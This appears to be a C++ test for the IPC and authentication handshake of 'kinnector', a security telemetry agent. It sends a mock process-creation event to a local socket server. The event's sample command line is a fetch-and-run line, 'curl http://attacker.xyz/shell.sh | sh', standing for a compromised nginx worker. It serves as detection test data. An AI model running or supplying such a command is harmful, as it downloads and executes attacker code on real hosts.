#include "kinnector/ipc.h"
#include "kinnector/telemetry.h"
#include <sys/socket.h>
#include <sys/un.h>
#include <sys/stat.h>
#include <unistd.h>
#include <iostream>
#include <thread>
#include <atomic>
#include <cstring>
#include <cassert>

const char* SOCKET_PATH = "/tmp/mock_kinnector_telemetry.sock";
const char* AUTH_TOKEN = "super-secret-agent-token-12345";

std::atomic<bool> server_ready{false};
std::atomic<bool> test_success{false};

void MockAgentServerLoop() {
    // Unlink path if exists
    unlink(SOCKET_PATH);

    int server_fd = socket(AF_UNIX, SOCK_STREAM, 0);
    if (server_fd < 0) {
        std::cerr << "[Server] Failed to create socket" << std::endl;
        return;
    }

    struct sockaddr_un addr;
    std::memset(&addr, 0, sizeof(addr));
    addr.sun_family = AF_UNIX;
    std::strncpy(addr.sun_path, SOCKET_PATH, sizeof(addr.sun_path) - 1);

    if (bind(server_fd, (struct sockaddr*)&addr, sizeof(addr)) < 0) {
        std::cerr << "[Server] Failed to bind socket" << std::endl;
        close(server_fd);
        return;
    }

    // Set secure permissions on socket file so only current user can access it
    chmod(SOCKET_PATH, 0600);

    if (listen(server_fd, 5) < 0) {
        std::cerr << "[Server] Listen failed" << std::endl;
        close(server_fd);
        return;
    }

    server_ready = true;
    std::cout << "[Server] Listening on " << SOCKET_PATH << std::endl;

    int client_fd = accept(server_fd, nullptr, nullptr);
    if (client_fd < 0) {
        std::cerr << "[Server] Accept failed" << std::endl;
        close(server_fd);
        return;
    }
    std::cout << "[Server] Client connected, performing handshake..." << std::endl;

    // Read token length
    uint32_t len = 0;
    if (read(client_fd, &len, sizeof(len)) != sizeof(len)) {
        std::cerr << "[Server] Failed to read token length" << std::endl;
        close(client_fd);
        close(server_fd);
        return;
    }

    // Read token string
    char token_buf[128] = {0};
    if (len >= sizeof(token_buf) || read(client_fd, token_buf, len) != static_cast<ssize_t>(len)) {
        std::cerr << "[Server] Failed to read token string" << std::endl;
        close(client_fd);
        close(server_fd);
        return;
    }

    std::cout << "[Server] Handshake token received: \"" << token_buf << "\"" << std::endl;

    uint8_t status = 0;
    if (std::strcmp(token_buf, AUTH_TOKEN) == 0) {
        status = 1; // Success
        std::cout << "[Server] Handshake AUTHENTICATED successfully" << std::endl;
    } else {
        status = 0; // Fail
        std::cerr << "[Server] Handshake AUTHENTICATION FAILED" << std::endl;
    }

    // Send verification response
    if (write(client_fd, &status, sizeof(status)) != sizeof(status)) {
        std::cerr << "[Server] Failed to write verification status" << std::endl;
        close(client_fd);
        close(server_fd);
        return;
    }

    if (status == 0) {
        close(client_fd);
        close(server_fd);
        return;
    }

    // Read event
    TelemetryEvent event;
    std::memset(&event, 0, sizeof(event));
    ssize_t bytes_read = read(client_fd, &event, sizeof(TelemetryEvent));
    if (bytes_read == sizeof(TelemetryEvent)) {
        std::cout << "[Server] Telemetry event received successfully!" << std::endl;
        std::cout << "  - Event Type: " << static_cast<int>(event.header.event_type) << std::endl;
        std::cout << "  - Source: " << static_cast<int>(event.header.source) << std::endl;
        std::cout << "  - PID: " << event.header.pid << std::endl;
        
        if (event.header.event_type == EventType::ProcessCreate) {
            std::cout << "  - Child PID: " << event.details.process_create.child_pid << std::endl;
            std::cout << "  - Child Image: " << event.details.process_create.child_image_path << std::endl;
            std::cout << "  - Cmdline: " << event.details.process_create.child_command_line << std::endl;
            
            // Validate content matches what we sent
            if (event.details.process_create.child_pid == 29314 &&
                std::strcmp(event.details.process_create.child_image_path, "/bin/bash") == 0) {
                test_success = true;
            }
        }
    } else {
        std::cerr << "[Server] Event read failed. Expected " << sizeof(TelemetryEvent) 
                  << " bytes, read " << bytes_read << " bytes." << std::endl;
    }

    close(client_fd);
    close(server_fd);
    unlink(SOCKET_PATH);
}

int main() {
    std::cout << "=== Running User-Space IPC and Handshake verification ===" << std::endl;

    // Start mock agent server thread
    std::thread server_thread(MockAgentServerLoop);

    // Wait for server to listen
    while (!server_ready) {
        std::this_thread::sleep_for(std::chrono::milliseconds(10));
    }

    // Initialize IPC telemetry sender client
    kinnector::ipc::IPCConfig config;
    config.socket_path = SOCKET_PATH;
    config.auth_token = AUTH_TOKEN;

    auto sender = kinnector::ipc::CreateTelemetrySender();
    assert(sender != nullptr);

    std::cout << "[Client] Connecting to Unix socket..." << std::endl;
    if (!sender->Start(config)) {
        std::cerr << "[Client] Failed to start IPC sender" << std::endl;
        if (server_thread.joinable()) server_thread.join();
        return 1;
    }

    // Wait for connection to connect & authenticate
    int retries = 0;
    while (!sender->IsConnected() && retries < 50) {
        std::this_thread::sleep_for(std::chrono::milliseconds(100));
        retries++;
    }

    if (!sender->IsConnected()) {
        std::cerr << "[Client] Connection timeout or failed authentication" << std::endl;
        sender->Stop();
        if (server_thread.joinable()) server_thread.join();
        return 1;
    }

    std::cout << "[Client] IPC connected & authenticated! Preparing telemetry event..." << std::endl;

    // Construct mock event matching ALERT-SCHEMA.md Example 8
    TelemetryEvent event;
    std::memset(&event, 0, sizeof(event));
    event.header.sequence_number = 605192;
    event.header.timestamp_ns = 1719285322100000000ULL;
    event.header.pid = 29112; // nginx worker PID
    event.header.event_type = EventType::ProcessCreate;
    event.header.source = TelemetrySource::BPF_LSM;

    event.details.process_create.child_pid = 29314; // spawned shell child PID
    event.details.process_create.real_parent_pid = 29112;
    std::strncpy(event.details.process_create.child_image_path, "/bin/bash", sizeof(event.details.process_create.child_image_path) - 1);
    std::strncpy(event.details.process_create.child_command_line, "/bin/bash -c 'curl http://attacker.xyz/shell.sh | sh'", sizeof(event.details.process_create.child_command_line) - 1);

    std::cout << "[Client] Sending ProcessCreate event..." << std::endl;
    if (sender->SendEvent(event)) {
        std::cout << "[Client] Event sent successfully" << std::endl;
    } else {
        std::cerr << "[Client] Send failed" << std::endl;
    }

    std::this_thread::sleep_for(std::chrono::milliseconds(200));

    sender->Stop();
    if (server_thread.joinable()) {
        server_thread.join();
    }

    if (test_success) {
        std::cout << "\n>>> TEST SUCCESSFUL! IPC stream and Auth Handshake validated. <<<" << std::endl;
        return 0;
    } else {
        std::cerr << "\n>>> TEST FAILED! <<<" << std::endl;
        return 1;
    }
}
